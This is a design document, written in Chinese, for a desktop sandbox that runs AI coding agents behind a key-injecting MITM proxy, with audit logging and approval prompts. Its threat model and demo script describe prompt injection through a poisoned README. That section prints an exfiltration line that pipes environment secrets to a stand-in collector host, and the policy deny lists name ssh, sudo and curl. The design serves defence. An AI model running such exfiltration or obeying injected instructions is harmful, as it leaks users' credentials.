# AIofCage 架构设计与实施文档

> 桌面级 AI Agent 安全沙箱：让 Claude Code、Codex、dsh 放手干活，密钥永远不进笼子。
> Qiniu Builder Day 2026 · 赛道一（产品研发组）
>
> 状态：设计定稿 v1 · 2026-10-23

---

## 0.1 给队友的一页速览

### 已拍板的八个决定

| # | 决定 | 一句话理由 |
|---|---|---|
| 1 | **单进程**：Wails 内直接跑门卫 / 策略 / 审计，不做 daemon | 本地工具正在去 daemon 化（microsandbox 重写时删掉了 server 与 supervisor）；省掉 IPC 与生命周期管理 |
| 2 | **出网拓扑**：`cage-internal`（无默认路由）+ 双网卡 relay | 不拥有 VMM 就只能这么做；`-p` 在内部网络无效、`host.docker.internal` 不可解析，都是实测结论 |
| 3 | **默认拒绝 + 未知目标弹窗询问** | 学 Docker 的姿态（沙箱即安全），但静默失败对普通用户是坏体验，所以补 Zed/Claude 的询问层 |
| 4 | **凭证链路只做 MITM（方案 A）** | base_url 只覆盖模型调用，MCP 与普通 API 仍要 MITM，等于维护两套；A 是市场主流（Docker / srt / E2B / Daytona 全是宿主侧拦截） |
| 5 | **审计在宿主侧生成并 hash 链化** | 判断逻辑与账本一旦进沙箱，VM 快照里就带着可伪造的审计（nono NEP-0007 的结论） |
| 6 | **`dsh` 走"自定义 Agent 命令"通道，不做专项适配** | 产品本来就该支持任意命令；这样 dsh 是不是 Linux 可执行，不再是阻塞项 |
| 7 | **仓库统一 `shaoxier/AIofCage`，所有 PR 合入** | 否则"多名成员提交记录"这条硬性规则不成立 |
| 8 | **明确不做**：内存快照 / fork、多 Agent 编排、Windows | 见 §2.2，写进文档比含糊其辞安全 |

> 以上 8 条不再作为议题讨论。有新信息（例如 dsh 无法在 Linux 运行、或某个 Agent 强制校验 key 格式）时，按 §14 的决策记录追加一条修订，而不是推翻重来。

### 分工建议

| 角色 | 负责 |
|---|---|
| A · 边界 | `gatekeeper` / `runtime` / `vault` / 容器镜像 |
| B · 平台 | `policy` / `audit` / `session` / `service` |
| C · 界面 | GUI 全部页面 + 审批交互 + 演示录制 |

### 两个硬门槛

- **T+4（今天 20:00）Gate 1**：容器内 `claude -p "hi"` 能拿到模型响应。过不了先排查 key 格式校验与客户端 OAuth——这是排查题，不是选型题（见 ADR-004）
- **T+56（10/25 深夜）**：冻结特性，只修 bug

---

## 0. 一句话定位

**Agent 在笼子里干活，钥匙永远不进笼子。**

不是"再包一层 Docker"，而是把三件事同时锁死：

1. **文件**——看不见宿主，除了一个工作区目录
2. **网络**——没有出网的路，只有经过门卫的一条
3. **凭证**——真密钥只在宿主钥匙串，笼子里只有占位符

---

## 1. 判分逻辑：评委实际在验什么

| 评委的问题 | 我们的答案 | 对应实现 |
|---|---|---|
| 这是真沙箱，还是 Agent 启动器？ | 三层边界（VM / 网络 / 凭证），且每层可现场验证 | §5.1 出网锁死、§5.4 容器硬化 |
| 安全策略有真实效果吗？ | 红队脚本 10 项攻击，裸 Docker 成功 8 项，本方案 0 项 | §9 演示脚本 |
| 普通用户会用吗？ | 选文件夹 → 选 Agent → 点启动；拦截时三选一弹窗 | §8 UI 骨架 |
| Agent 真能跑通吗？ | Claude Code / Codex 在笼子里完成真实任务，模型调用也走门卫 | §5.3 凭证链路 |

**"桌面级"的正确定位**：约束的是**产品形态与用户**（面向非技术用户的 GUI 产品），不是"隔离必须跑在桌面"。隔离体放本地或云端都成立；本项目选择本地，因为演示不依赖网络。

---

## 2. 目标与非目标

### 2.1 目标（P0，必须交付）

1. 一个 macOS 桌面应用：选项目文件夹 → 选 Agent → 一键启动
2. Agent 运行在隔离环境中，只能看到工作区目录
3. 容器无默认路由，唯一出口是宿主门卫代理
4. 真实密钥只存在于 macOS 钥匙串；容器内只有占位符
5. 门卫按"域名 + HTTP 方法 + 路径"判定放行/拦截/注入
6. 拦截时弹窗给用户三选一：本次允许 / 本会话允许 / 永久拒绝
7. 审计事件流：可筛选、可导出、hash 链可验证
8. MCP 免填密钥（以 GitHub MCP 为样例，MCP 走同一条门卫链路）
9. 一键模拟攻击 + 差分对比

### 2.2 非目标（明确不做，写进文档避免被追问）

| 不做 | 理由 |
|---|---|
| 自研 hypervisor / microVM | Docker、E2B、microsandbox、Blaxel 全都站在别人的 VMM 上；这是 6 个月的项目 |
| 通用 TLS MITM 的完整兼容（证书固定、gRPC、QUIC） | 只覆盖 HTTP(S) 白名单域名；QUIC/UDP 一律阻断 |
| MCP OAuth / DCR 全流程 | Docker 自己的文档说明了复杂度；只支持静态 header token |
| 内存级快照 / fork | 需要 userfaultfd + COW；只做"停止/启动保留磁盘" |
| 多 Agent 编排、跨沙箱通信 | 一个沙箱一个 Agent 已经是完整故事 |
| Windows / WSL2 | 只支持 macOS + Apple Silicon |
| GUI 策略编辑器的高级能力（自然语言规则等） | JSON 策略 + 预设 + 弹窗足够 |
| 防内核 0day | 威胁模型不含内核提权；见 §3.3 |

---

## 3. 威胁模型

### 3.1 攻击面

| 攻击者 | 手法 | 后果 |
|---|---|---|
| 被投毒的仓库 / README / 网页 | 提示词注入，诱导 Agent 执行命令 | 删文件、外泄密钥、反弹 shell |
| Agent 自身的错误 | 误删、误改、误 push | 数据损坏 |
| 恶意 MCP server | 工具返回值投毒 / 自行外联 | 数据外泄 |
| 供应链 | `npx -y` 拉取任意包 | 在沙箱内执行任意代码（可接受，因为沙箱内无密钥） |

### 3.2 资产

- 宿主文件（`~/.ssh`、`~/.aws`、其他项目）
- API Key / Token（Anthropic、OpenAI、GitHub、MCP server）
- 额度（被投毒 Agent 刷光）

### 3.3 信任边界

```
┌───────────────────── 可信 ─────────────────────┐
│ macOS 宿主                                      │
│  · Keychain（唯一存放真密钥的地方）              │
│  · 门卫代理（唯一持有真密钥的进程）              │
│  · 策略引擎 / 审计账本                          │
└───────────────────────┬─────────────────────────┘
                        │ 占位符 / 受控请求
┌───────────────────────▼─────────────────────────┐
│ colima VM（半可信）                             │
│  · mounts 白名单：只有 ~/CageWorkspace 可见     │
│  · relay 容器（唯一出口）                       │
│  · Docker 引擎（容器逃逸的落点）                │
└───────────────────────┬─────────────────────────┘
                        │ 无默认路由
┌───────────────────────▼─────────────────────────┐
│ agent 容器（不可信）                            │
│  · Claude Code / Codex / dsh                    │
│  · 只有占位符，没有真密钥                       │
└─────────────────────────────────────────────────┘
```

**关键论证（答辩用）**：

> 容器逃逸的落点是 colima 虚拟机，而这台虚拟机只挂载了 `~/CageWorkspace` 一个目录。
> 这是 VM 层白名单，不是容器配置——逃逸出来也摸不到 `~/.ssh`。
> 即使容器被完全拿下，密钥仍然不在笼子里，外泄仍然要过门卫。这两个性质不依赖容器是否被攻破。

### 3.4 不做防护的场景

- 宿主门卫进程被攻破（它持有真密钥）
- macOS 内核 / Virtualization.framework 的 0day
- 用户在弹窗里主动点了"永远允许"
- 供应链投毒发生在镜像构建阶段

---

## 4. 总体架构

### 4.1 部署拓扑

```
┌──────────────────────────── macOS 宿主 ────────────────────────────┐
│                                                                    │
│  ┌──────────────────── AIofCage.app (Wails, 单进程) ────────────┐  │
│  │   GUI (WebView)                                              │  │
│  │     ↕ Wails bindings                                         │  │
│  │   internal/service  ──┬── policy   策略引擎                   │  │
│  │                       ├── vault    Keychain 适配              │  │
│  │                       ├── audit    hash 链账本                │  │
│  │                       ├── runtime  容器/网络生命周期          │  │
│  │                       └── gatekeeper  门卫代理 :8899          │  │
│  └───────────────────────────────┬──────────────────────────────┘  │
│                                  │ 127.0.0.1:8899                  │
│                                  │ (gvproxy 转发)                  │
│  ~/CageWorkspace  ──── mounts 白名单（VM 层）                       │
└──────────────────────────────────┼─────────────────────────────────┘
                                   │
┌──────────────────── colima VM (vz) ┼────────────────────────────────┐
│                                    │                               │
│   relay (alpine/socat)  ───────────┘                               │
│     eth0: docker0 (默认 bridge)  → host.docker.internal:8899        │
│     eth1: cage-internal          ← 监听 :8888                       │
│           ▲                                                        │
│           │ 唯一可达目的地                                          │
│   agent 容器（只连 cage-internal，无默认路由）                       │
│     HTTP_PROXY=http://relay:8888                                    │
│     Claude Code / Codex / dsh                                       │
│     ~/CageWorkspace → /work                                         │
└────────────────────────────────────────────────────────────────────┘
```

### 4.2 一次请求的完整链路

```
Agent 发起 HTTPS 请求
  → 容器无默认路由，只能连 relay:8888
  → relay 转发到宿主 127.0.0.1:8899
  → 门卫代理按域名/方法/路径匹配策略
      ├─ 未命中白名单  → 403 + 审计 DENY + GUI 弹窗
      └─ 命中白名单    → MITM 解密 → 覆盖 Authorization 为真密钥
                        → 转发上游 → 响应脱敏 → 审计 ALLOW/INJECT
```

### 4.3 分层与职责

| 层 | 职责 | 代码位置 |
|---|---|---|
| L1 交互 | GUI 页面、审批弹窗、审计表格 | `frontend/` |
| L2 服务 | 用例编排、Wails 绑定、事件推送 | `internal/service` |
| L3 领域 | 策略、凭证、审计、会话状态机 | `internal/{policy,vault,audit,session}` |
| L4 边界 | 门卫代理、CA 管理、容器与网络 | `internal/{gatekeeper,runtime}` |
| L5 适配 | Docker CLI、`security` CLI、colima | `internal/{dockerx,keychain}` |

**原则**：L1/L2 不直接接触密钥；只有 `vault` 和 `gatekeeper` 能解出真密钥，且只存在于内存。

---

## 5. 关键机制设计

### 5.1 出网锁死（已在本机实测）

**三条实测结论**（决定拓扑，不是推测）：

| 结论 | 实测结果 |
|---|---|
| `--internal` 网络无默认路由 | 路由表只有子网路由，无 default |
| `--internal` 仍可访问桥网关 | 可 ping 通 172.x.0.1（那是 VM，不是 macOS） |
| 内部网络下 `-p` 端口发布 | **无效**，`docker port` 为空 |
| 内部网络下 `host.docker.internal` | **DNS SERVFAIL**；直连宿主 IP 被丢弃 |
| 普通 bridge 访问宿主 `127.0.0.1:8899` | **可用**（colima gvproxy 转发） |

**因此唯一可行拓扑：双网卡 relay 容器。**

```bash
# 1) 内部网络：无路由
docker network create --internal cage-internal

# 2) relay：双网卡，唯一出口
docker run -d --name cage-relay \
  --network bridge \
  --network-alias relay \
  alpine/socat \
  TCP-LISTEN:8888,fork,reuseaddr TCP:host.docker.internal:8899
docker network connect cage-internal cage-relay --alias relay

# 3) agent：只连内部网络
docker run -it --name cage-agent \
  --network cage-internal \
  --user 1000:1000 \
  --read-only --tmpfs /tmp --tmpfs /home/agent \
  --cap-drop ALL --security-opt no-new-privileges \
  -v ~/CageWorkspace/<project>:/work \
  -e HTTP_PROXY=http://relay:8888 -e HTTPS_PROXY=http://relay:8888 \
  -e NO_PROXY=localhost,127.0.0.1,relay \
  aiocage/agent:dev
```

**验收标准**：容器内 `curl -sS https://api.github.com` 走通；`curl --noproxy '*' https://api.github.com` 必须失败；`ip route` 无 default。

### 5.2 门卫代理

**选型**：`github.com/elazarl/goproxy v1.9.2`（2026-09 仍在维护；`go-mitmproxy` 叶子证书复用 CA 私钥，`martian` 已归档）。

**两个必须避开的坑**：

1. **goproxy 自带公开的 CA 私钥**（`GoproxyCa`），任何人都能用它解密。必须自签 CA 并自己构造 `ConnectAction`，禁止使用 `goproxy.AlwaysMitm`。
2. **goproxy 默认读取宿主 `HTTPS_PROXY` 环境变量**（`Tr.Proxy` 与 `ConnectDial`），会莫名链式转发。必须显式清空。

```go
// 正确的构造方式
proxy := goproxy.NewProxyHttpServer()
proxy.Tr = &http.Transport{
    Proxy: nil,                        // 禁止读取环境变量
    TLSClientConfig: &tls.Config{MinVersion: tls.VersionTLS12},
    ForceAttemptHTTP2: false,          // 上游统一走 h1，SSE 更简单
}
proxy.ConnectDial = nil                // 同上
proxy.ConnectDialWithReq = nil

mitm := &goproxy.ConnectAction{
    Action:    goproxy.ConnectMitm,
    TLSConfig: goproxy.TLSConfigFromCA(&ownCA),   // 自签 CA
}
proxy.OnRequest().HandleConnectFunc(func(host string, ctx *goproxy.ProxyCtx) (*goproxy.ConnectAction, string) {
    if !policy.AllowsHost(stripPort(host)) {
        ctx.Resp = goproxy.NewResponse(ctx.Req, "text/plain", http.StatusForbidden,
            "AIofCage: destination not allowed by policy")
        return goproxy.RejectConnect, host
    }
    return mitm, host
})
```

**请求处理顺序**：

```
CONNECT
  → 域名白名单？否 → 403 + DENY 审计 + 弹窗
  → 是 → MITM
       → 匹配规则（host → method → path）
       → 决策：deny / ask / allow / inject
       → inject：从 vault 取密钥，**覆盖**（Set，非 Add）Authorization
       → 剥离入站 Proxy-Authorization / X-Forwarded-*
       → 转发
响应
  → 剥离 WWW-Authenticate（防止容器内客户端自行发起 OAuth）
  → 脱敏：响应体中出现真密钥则替换为 [REDACTED]
  → 记录体积、状态码、耗时
```

**日志红线**：默认不记录请求/响应体；不记录任何 header 原文；只记录 `method / host / path / decision / rule / bytes`。

### 5.3 凭证链路（本项目最关键的设计）

**问题**：容器里没有密钥，但 Agent 连模型 API 也要鉴权。

**方案 A（默认）：统一走门卫 MITM**

- 容器内注入占位符：`ANTHROPIC_API_KEY=cage-a1b2c3d4`、`OPENAI_API_KEY=cage-a1b2c3d4`
- 门卫对 `api.anthropic.com` / `api.openai.com` 的请求覆盖真实 `x-api-key` / `Authorization`
- 优点：一条链路管全部（LLM + MCP + 普通 API）
- 风险：若 Agent 在本地校验 key 格式会失败 → 见降级路径

**方案 B（降级）：base_url 指向门卫**

- 若 A 失败，改为 `ANTHROPIC_BASE_URL=http://relay:8888/llm/anthropic`、Codex `model_providers.base_url`
- 门卫以明文 HTTP 接收，无需 CA
- 缺点：需要为每个 Agent 写适配，且 MCP 仍要走 A

**决策：只做 A。** base_url 不能替代 MITM——它只覆盖模型调用，MCP 与普通 API 仍然需要 MITM，等于要维护两条链路。T+4 的验证是**排查题，不是选型题**：失败了先查 key 格式校验和客户端 OAuth，不要掉头重做架构。

**占位符规则**：

```
格式：cage-<8 hex>
作用域：一个 provider 一个占位符
替换条件：目标域名 ∈ 规则.injectHosts 且 header 值 == 该占位符
否则：请求原样转发（或按策略拒绝），占位符不出现在任何日志里
```

### 5.4 容器硬化清单

| 项 | 值 | 目的 |
|---|---|---|
| 用户 | `--user 1000:1000` | 非 root |
| 根文件系统 | `--read-only` + `--tmpfs /tmp` + `--tmpfs /home/agent` | 防持久化 |
| capabilities | `--cap-drop ALL` | 无 NET_ADMIN / SYS_ADMIN |
| 提权 | `--security-opt no-new-privileges` | 阻断 setuid |
| Docker socket | **绝不挂载** | 防容器逃逸到宿主 Docker |
| 网络 | 仅 `cage-internal` | 无默认路由 |
| 挂载 | 仅项目目录，`-v ...:/work` | 最小暴露 |
| 资源 | `--memory 4g --cpus 2 --pids-limit 512` | 防跑飞 demo 机器 |

### 5.5 隔离的三层边界

| 层 | 机制 | 现场验证方式 |
|---|---|---|
| 文件 | colima `mounts` 只允许 `~/CageWorkspace` | 容器内 `ls /Users/<user>` 不存在；宿主上该目录存在 |
| 网络 | `--internal` 无路由 + relay 唯一出口 | `curl --noproxy '*'` 失败；`ip route` 无 default |
| 凭证 | Keychain + 占位符 | 容器内 `env | grep -i key` 只有 `cage-xxxxxxxx` |

### 5.6 审计账本

- 追加写 JSONL：`~/Library/Application Support/AIofCage/audit/<session>.jsonl`
- 每条事件 **FETCH 入** `prev_hash`，`hash = sha256(prev_hash || canonical_json(event))`
- `cage audit verify <file>` 逐条校验，输出首个断链位置
- 事件由宿主产生，容器内无法写入或修改
- 导出：JSONL / CSV

### 5.7 会话生命周期

```
create → starting → running ⇄ paused → stopped → deleted
                 ↘ failed
```

| 阶段 | 动作 | 状态存放 |
|---|---|---|
| create | 建 network、relay、agent 容器、生成策略快照 | SQLite / JSON metadata |
| starting | 等待容器 ready + 门卫自检通过 | 内存 |
| running | 终端 attach、审计流、审批队列 | — |
| stopped | 停容器，保留磁盘与策略 | Docker volume |
| deleted | 删除容器、网络、临时卷（审计保留） | — |

**单进程架构**：Wails 应用内直接持有全部服务，不做独立 daemon（省掉 IPC 与生命周期管理）。代价：GUI 崩溃会留下孤儿容器，启动时做一次清理。

---

## 6. 策略模型

### 6.1 策略文件

```json
{
  "version": 1,
  "name": "workspace-default",
  "filesystem": {
    "workspace": "rw",
    "readonly": ["/usr/local/bin", "/usr/lib"],
    "deny": ["~/.ssh", "~/.aws", "~/.config/gh"]
  },
  "network": {
    "default": "deny",
    "rules": [
      { "host": "api.anthropic.com", "methods": ["POST"], "decision": "inject", "secret": "anthropic" },
      { "host": "api.openai.com",    "methods": ["POST"], "decision": "inject", "secret": "openai" },
      { "host": "registry.npmjs.org", "methods": ["GET"],  "decision": "allow" },
      { "host": "api.github.com",    "decision": "ask" },
      { "host": "*.githubusercontent.com", "decision": "deny" }
    ]
  },
  "commands": {
    "default": "allow",
    "ask": ["git push *", "rm -rf *", "curl *"],
    "deny": ["sudo *", "ssh *"]
  },
  "secrets": {
    "anthropic": { "placeholder": "cage-a1b2c3d4", "inject": ["api.anthropic.com"], "header": "x-api-key" },
    "openai":    { "placeholder": "cage-e5f6g7h8", "inject": ["api.openai.com"], "header": "Authorization", "prefix": "Bearer " }
  }
}
```

### 6.2 决策顺序

```
1. host 命中 deny 规则                → DENY（不再继续匹配）
2. host 命中 inject 规则              → INJECT
3. method/path 命中 ask               → ASK（挂起，等用户）
4. host 命中 allow                    → ALLOW
5. 默认                               → DENY
```

**不可协商**：默认拒绝；`deny` 优先级最高；用户弹窗只能把 `ask` 提升为 allow，不能绕过 `deny`。

### 6.3 预设

| 预设 | 文件 | 网络 | 适用 |
|---|---|---|---|
| 只读 | 只读 | 全拒 | 审查陌生仓库 |
| 工作区（默认） | 工作区 rw | 模型 API + 包仓库 | 日常开发 |
| 放开 | 工作区 rw | 白名单 + 未知域名询问 | 需要装依赖 |

---

## 7. 审计事件模型

### 7.1 字段

| 字段 | 类型 | 说明 |
|---|---|---|
| `id` | string | 事件 ID（单调递增 + 随机后缀） |
| `ts` | RFC3339 | 宿主时钟 |
| `session_id` | string | 沙箱会话 |
| `actor` | enum | `agent` / `user` / `system` |
| `action` | enum | `net.connect` / `net.inject` / `fs.write` / `exec` / `approval` / `policy.change` / `session` |
| `decision` | enum | `allow` / `deny` / `ask` / `inject` / `error` |
| `resource` | string | 完整资源（URL / 路径 / 命令） |
| `host` / `method` / `path` | string | 网络类事件专用 |
| `rule` | string | 命中的规则原文或 ID |
| `secret` | string | 密钥**名称**（绝不记录值） |
| `reason` | string | 人类可读原因 |
| `bytes_in` / `bytes_out` | int | 流量 |
| `status` | int | 上游 HTTP 状态码 |
| `duration_ms` | int | 耗时 |
| `prev_hash` | string | 前一条 hash |
| `hash` | string | 本条 hash |

### 7.2 不可记录的内容

- 任何 header 原文（尤其是 `Authorization` / `x-api-key`）
- 请求/响应体（除非用户主动开启"调试模式"，且此时密钥已脱敏）
- 密钥值本身

---

## 8. UI 骨架

### 8.1 信息架构

```
Sessions（默认）
  └─ Session Detail
       ├─ Console（终端）
       ├─ Activity（事件流）
       ├─ Changes（文件 diff）
       ├─ Requests（待审批收件箱）
       └─ Policy（本次会话生效策略）
Policies（预设 + 编辑）
Secrets（钥匙串条目）
Audit（全局审计）
Settings（Agent 路径、默认预设、审计保留）
```

**原则**：审批只出现在一个地方（Requests）；策略只有一份（Policy）；审计只有一条流（Audit）。

### 8.2 Sessions

```
┌──────────────────────────────────────────────────────────────────────┐
│ ● AIofCage                          [⌘K]            [+ New Session]  │
├──────────────┬───────────────────────────────────────────────────────┤
│ SESSIONS  3  │  Needs you (1)                                        │
│  All         │  ┌─────────────────────────────────────────────────┐  │
│  Running  2  │  │ ● acme-api    Claude Code   ask · 2 pending     │  │
│  Needs you 1 │  │   ~/CageWorkspace/acme-api              [Review] │  │
│  Stopped  1  │  └─────────────────────────────────────────────────┘  │
│              │  Running                                              │
│ POLICIES     │  ┌─────────────────────────────────────────────────┐  │
│ SECRETS      │  │ ● docs-site   Codex        workspace · clean    │  │
│ AUDIT        │  └─────────────────────────────────────────────────┘  │
│              │  Stopped                                              │
│ ⚙ Settings   │  └ ○ spike     Claude Code   stopped 2h ago           │
└──────────────┴───────────────────────────────────────────────────────┘
```

### 8.3 Session Detail

```
┌──────────────────────────────────────────────────────────────────────┐
│ ← acme-api   ● Running   Claude Code   ~/CageWorkspace/acme-api 00:14│
├──────────────────┬──────────────────────────┬────────────────────────┤
│ ACTIVITY         │ CONSOLE                  │ REQUESTS          1    │
│ [All][Net][Files]│                          │ ┌────────────────────┐ │
│                  │ $ npm test               │ │ ⚠ Connect          │ │
│ 14:02 ✔ allow    │ ...                      │ │ api.github.com     │ │
│  npm test        │                          │ │ [Deny][Allow][…]   │ │
│ 14:04 ✖ deny     │                          │ └────────────────────┘ │
│  ~/.ssh/config   │                          │ POLICY                 │
│ 14:06 ● inject   │                          │ workspace · 4 hosts    │
│  api.anthropic   │                          │ secrets: 2             │
├──────────────────┴──────────────────────────┴────────────────────────┤
│ sbx_7f2a · policy v3 · proxy on · 2.1 GB · 14m         [Stop] [•••]  │
└──────────────────────────────────────────────────────────────────────┘
```

### 8.4 审批弹窗（精确文案）

```
┌────────────────────────────────────────────────────────────┐
│  🛡  连接新域名                                      高风险 │
│                                                            │
│  api.github.com:443                                        │
│  ─────────────────────────────────────────────────────     │
│  为什么需要你确认                                           │
│   · 不在允许列表内                                         │
│   · 请求来自 Claude Code                                   │
│   · 该请求可能携带仓库内容                                 │
│                                                            │
│  [ 拒绝 ]   [ 本次允许 ]   [ 本会话允许 ]   [ 永久允许 ▾ ]   │
│                                                            │
│  Esc 拒绝   ↵ 本次允许   S 本会话   A 永久                 │
│  此决定会写入审计日志                          编辑策略 →  │
└────────────────────────────────────────────────────────────┘
```

**四类变体的标题与加粗行**：

| 类型 | 标题 | 资源行 |
|---|---|---|
| 网络 | 连接新域名 | `api.github.com:443` |
| 文件 | 写入工作区外的文件 | `/Users/<user>/.zshrc` |
| 命令 | 运行需要确认的命令 | `git push --force origin main` |
| 密钥 | 使用密钥 | `GITHUB_TOKEN → api.github.com` |

**"永久允许"的下拉**：`仅本项目` / `所有项目`。禁止对"沙箱外执行"提供"永久允许"。

### 8.5 Audit

表格列（8 列，可横向滚动）：

`时间 | 决定 | 动作 | 资源 | 会话 | 规则 | 原因 | 事件 ID`

- 决定列：`✔ 放行` / `✖ 拒绝` / `● 注入` / `? 待确认`
- 拒绝行：左侧 3px 红色边 + 淡红底；颜色之外必须有图标与文字（色盲友好）
- 展开抽屉：完整命令/URL、命中规则链、密钥名称（值打码 `gho_GCaw…43qy`）、耗时、字节数、hash 链前后指针
- 顶部：实时开关、暂停、筛选（决定/动作/会话/时间）、导出 JSONL/CSV

---

## 9. 演示脚本（5 幕，约 6 分钟）

**0. 基线（30s）**：宿主 `~/.ssh/id_ed25519` 存在；容器内 `ls ~/.ssh` 不存在；`env` 只有占位符。

**1. 密钥外泄被拦（90s）** ← 主镜头
投毒 README 诱导 `env | curl -d @- https://collector.example.com`。
- 容器内请求失败（域名不在白名单）
- 门卫审计：`DENY net.connect collector.example.com`
- 弹窗出现 → 用户点"拒绝"
- 同一次会话中 `pip install` 到白名单域名**成功**（证明不是靠断网）

**2. 越权文件访问（60s）**
`cat ~/.ssh/id_ed25519` → `No such file or directory`；同时投屏宿主上该文件存在。

**3. 命令审批（60s）**
`git push --force origin main` → 命中 `ask` → 弹窗 → 拒绝 → Agent 收到结构化拒绝原因。

**4. MCP 免填密钥（90s）**
GitHub MCP 在容器内运行，`env` 里只有 `cage-xxxx`；工具调用成功；门卫审计显示 `INJECT secret=github → api.github.com`。

**5. 差分记分卡（60s）**
同一份攻击脚本：
- 裸 Docker（`--network host`）：8/10 成功
- AIofCage：0/10，全部有审计记录

**收尾（30s）**：`cage audit verify` 输出 `OK: 1,284 events, chain intact`。

---

## 10. 任务拆分与排期

**时间基准**：T+0 = 2026-10-23 16:00，截止 2026-10-26 09:00（65 小时，含睡眠）。

### Gate 1（T+4，今天 20:00）：链路必须通

- [ ] colima 起来（`--cpu 4 --memory 6`），`mounts: [~/CageWorkspace]`
- [ ] `cage-internal` + relay + agent 三件套跑通
- [ ] 容器内 `curl https://api.github.com` 走门卫成功
- [ ] `claude --version` 在容器内可执行
- [ ] **方案 A 验证**：占位符 + MITM 注入后，`claude -p "hi"` 能否得到模型响应

> 过不了 Gate 1：先查 key 格式校验、客户端 OAuth、CA 是否被 Node 认到；最坏情况只对 LLM 临时退到 base_url，MCP 仍走 MITM。**不推翻架构。**

### Day 1（T+0 → T+12）：链路 + 门卫

| 模块 | 产出 | 验收 |
|---|---|---|
| `runtime` | 网络/relay/容器启停 | 三件套可重复创建销毁 |
| `gatekeeper` | 自签 CA、MITM、覆盖 header、403 | 单测：占位符→真值、非白名单 403 |
| `policy` | JSON 解析 + 决策 | 单测覆盖 6 种决策路径 |
| `audit` | JSONL + hash 链 | `verify` 通过 |
| `vault` | Keychain 读写 | 增删查可用 |
| 镜像 | `aiocage/agent:dev` | CA + Node/Python 环境变量正确 |

### Day 2（T+12 → T+36）：产品闭环

| 模块 | 产出 |
|---|---|
| `session` | 状态机 + 元数据持久化 |
| `service` | Wails 绑定、事件推送 |
| GUI | Sessions / Detail / Console / Requests |
| 审批 | 队列、四类弹窗、三种作用域、写审计 |
| Secrets 页 | 增删改、打码展示 |
| Audit 页 | 表格 + 筛选 + 导出 |

### Day 3（T+36 → T+60）：演示 + 文档

| 时间 | 事项 |
|---|---|
| T+36 ~ T+44 | 红队脚本 + 差分对比 + 一键模拟攻击按钮 |
| T+44 ~ T+50 | 录屏（5 幕）、截图 |
| T+50 ~ T+56 | 架构文档、模块规格、分工说明、README 运行说明 |
| T+56 ~ T+60 | 冻结特性，只修 bug |
| T+62 | 提交 |

### 分工建议（3 人）

| 角色 | 负责 |
|---|---|
| A · 边界 | `gatekeeper` / `runtime` / `vault` / 镜像 |
| B · 平台 | `policy` / `audit` / `session` / `service` |
| C · 界面 | GUI 全部页面 + 审批交互 + 演示录制 |

---

## 11. 目录结构（Go 骨架）

```
AIofCage/
├── main.go                     # Wails 入口
├── go.mod
├── internal/
│   ├── service/                # Wails 绑定层（唯一暴露给前端的 API）
│   │   ├── app.go
│   │   ├── sessions.go
│   │   ├── approvals.go
│   │   └── events.go
│   ├── session/                # 会话状态机 + 元数据
│   ├── policy/                 # 策略模型、解析、匹配、决策
│   │   ├── model.go
│   │   ├── matcher.go
│   │   └── decision.go
│   ├── gatekeeper/             # 门卫代理
│   │   ├── proxy.go            # goproxy 装配
│   │   ├── ca.go               # 自签 CA + 证书缓存
│   │   ├── inject.go           # 占位符替换
│   │   └── redact.go           # 日志/响应脱敏
│   ├── vault/                  # Keychain
│   │   ├── store.go            # 接口
│   │   └── keychain.go         # security CLI 实现
│   ├── audit/                  # 审计账本
│   │   ├── ledger.go
│   │   └── verify.go
│   ├── runtime/                # 容器与网络
│   │   ├── docker.go
│   │   ├── network.go
│   │   └── relay.go
│   ├── approval/               # 审批队列 + 作用域
│   └── dockerx/                # docker CLI 薄封装
├── frontend/                   # Wails 前端
│   └── src/
│       ├── pages/{Sessions,SessionDetail,Policies,Secrets,Audit,Settings}
│       └── components/{ApprovalSheet,AuditTable,ActivityFeed,PolicyEditor}
├── docker/
│   └── agent/Dockerfile        # 预置 CA、Node、claude、codex
├── scripts/
│   ├── setup-colima.sh
│   ├── redteam.sh              # 红队脚本
│   └── demo-reset.sh
└── docs/
    ├── architecture.md         # 本文档
    ├── modules.md              # 模块规格（待填）
    └── demo.md                 # 演示脚本
```

---

## 12. 降级路径

| 失效点 | 降级方案 | 代价 |
|---|---|---|
| MITM 注入不通（Agent 强制校验 key 格式或走 OAuth） | 仅对 LLM 退到 base_url；MCP 仍走 MITM | 两套链路并存，最坏情况多写一个适配器 |
| colima 不可用 | 换 Docker Desktop（但 `$HOME` 默认共享，必须改配置） | 边界变弱，话术要改 |
| Wails 构建失败 | CLI + 录屏兜底 | 失去"桌面产品"卖点，扣分 |
| `host.docker.internal` 不通 | relay 改为连 `host.lima.internal` 或 VM 网关 | 需要额外探测 |
| 时间不足 | 砍 Policies 页与 Changes 页，只保留 Sessions/Detail/Audit | 功能完整度下降 |

---

## 13. 提交物清单（对照规则）

- [ ] 全部源代码（PR 合入 `shaoxier/AIofCage`）
- [ ] 运行说明（README：一条命令跑起来）
- [ ] 架构设计文档（本文档）
- [ ] 模块规格与分工说明（`docs/modules.md`）
- [ ] Demo 视频（5 幕，≤6 分钟）
- [ ] 开发过程：多人 PR 记录，非最后一天一次性提交

---

## 14. 决策记录（ADR）

只记录**有争议、且被否掉了其他选项**的决定。修改时追加新条目，不删旧条目。

### ADR-001 单进程，不做 daemon

- **决定**：门卫、策略、审计、容器编排全部跑在 Wails 进程内。
- **被否**：`sandboxd` 独立守护进程 + UDS（Docker sbx 的做法）。
- **理由**：daemon 需要处理进程守护、socket 鉴权、版本协商、崩溃恢复四件事，在 60 小时内是纯负债。microsandbox 重写时把 server 和 supervisor 都删掉了，是最强的信号。
- **代价**：GUI 崩溃会留下孤儿容器 → 启动时做一次 reconcile（按 metadata 里的容器 ID 清理）。
- **何时应推翻**：如果要做多客户端（CLI + GUI 同时操作同一沙箱）。

### ADR-002 双网卡 relay，而不是端口发布或 unix socket

- **决定**：`cage-internal` + relay 容器（bridge + internal 双网卡）。
- **被否**：
  - `-p` 端口发布 —— **实测在内部网络下无效**，`docker port` 为空。
  - unix socket —— colima 通过 virtiofs 共享文件系统，**unix socket 不能跨 VM 边界**。
  - 在 VM 内跑门卫 —— 门卫需要读 macOS Keychain，做不到。
- **理由**：这是"容器无默认路由但可达代理"在 colima 上唯一成立的组合。
- **代价**：多一个容器；relay 必须最小化（单端口、无 shell）。

### ADR-003 默认拒绝 + 询问，而不是静默拒绝

- **决定**：未命中白名单的网络请求挂起，弹窗让用户三选一。
- **被否**：Docker sbx 的"无提示、直接阻断"。
